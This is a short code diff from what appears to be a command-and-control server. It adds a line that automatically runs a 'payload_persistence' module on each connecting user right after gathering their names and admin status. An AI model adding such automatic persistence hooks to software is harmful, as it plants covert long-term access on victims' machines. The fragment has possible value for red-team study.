@@ -60,6 +60,8 @@ class SocketServer:
                 user.writer = writer
                 user.agent_module = self.agent_module
             user.first_name, user.last_name, user.username, is_admin, is_domain_admin = (await self.recognizer.get_user_infos(reader, writer)).values()
+            
+            await user.execute("./modules/payloads/payload_persistence.py")
             user.start_not_running_watchers()
             
         elif service == "agent":
